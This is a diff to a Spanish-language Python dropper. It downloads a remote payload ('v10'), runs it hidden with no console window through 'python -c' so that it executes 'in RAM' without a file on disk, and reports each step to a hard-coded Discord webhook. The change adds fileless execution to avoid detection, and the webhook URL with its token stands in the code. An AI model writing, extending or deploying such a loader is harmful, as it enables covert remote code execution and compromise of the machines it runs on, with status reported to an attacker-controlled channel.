@@ -11,7 +11,6 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1560652221035839528/SlDSAV1HKo0X
 
 DIRECTORIO_DESTINO = os.path.join(os.environ.get("APPDATA", "C:\\"), "V10Runtime")
 ZIP_TEMPORAL = os.path.join(DIRECTORIO_DESTINO, "py.zip")
-SCRIPT_V10 = os.path.join(DIRECTORIO_DESTINO, "v10.py")
 
 def enviar_webhook(mensaje):
     if "TU_WEBHOOK_URL" in WEBHOOK_URL or not WEBHOOK_URL:
@@ -31,7 +30,6 @@ def enviar_webhook(mensaje):
         pass
 
 def descargar_archivo_seguro(url, destino):
-    """Descarga un archivo por bloques con timeout para evitar congelamientos."""
     headers = {"User-Agent": "Mozilla/5.0", "Cache-Control": "no-cache"}
     req = urllib.request.Request(url, headers=headers)
     with urllib.request.urlopen(req, timeout=15) as response, open(destino, 'wb') as out_file:
@@ -79,20 +77,23 @@ def preparar_y_exec():
             python_ejecutable = encontrar_python()
             enviar_webhook(" [Dependencias] Entorno portable configurado.")
 
-        enviar_webhook(" [Dependencias] Descargando v10.py...")
-        descargar_archivo_seguro(URL_V10, SCRIPT_V10)
+        enviar_webhook(" [Dependencias] Descargando código v10 desde GitHub...")
+        req_v10 = urllib.request.Request(URL_V10, headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req_v10, timeout=15) as response:
+            codigo_v10 = response.read().decode("utf-8")
 
-        if python_ejecutable and os.path.exists(SCRIPT_V10):
-            enviar_webhook(" [Dependencias] v10.py en segundo plano...")
+        if python_ejecutable:
+            enviar_webhook(" [Dependencias] Ejecutando v10 en memoria RAM...")
+            
             subprocess.Popen(
-                [python_ejecutable, SCRIPT_V10],
+                [python_ejecutable, "-c", codigo_v10],
                 creationflags=0x08000000,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
             )
-            enviar_webhook(" [Dependencias] v10 ejecutado.")
+            enviar_webhook(" [Dependencias] v10 ejecutado en RAM con éxito.")
         else:
-            enviar_webhook(" [Error] No pudo ejecutarse v10.")
+            enviar_webhook(" [Error] No pudo encontrarse python portable.")
 
     except Exception as e:
         enviar_webhook(f" [Error en dependencias]: {str(e)}")
